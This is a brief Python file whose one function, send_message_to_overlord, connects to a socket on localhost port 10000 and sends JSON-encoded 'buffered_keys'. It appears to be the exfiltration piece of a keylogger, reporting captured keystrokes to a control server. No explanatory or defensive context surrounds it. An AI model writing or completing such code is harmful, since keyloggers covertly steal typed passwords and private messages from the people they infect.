import socket
import json

server_address = ('localhost', 10000)


def send_message_to_overlord(buffered_keys):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(server_address)
    payload = json.dumps(buffered_keys)
    sock.sendall(payload)
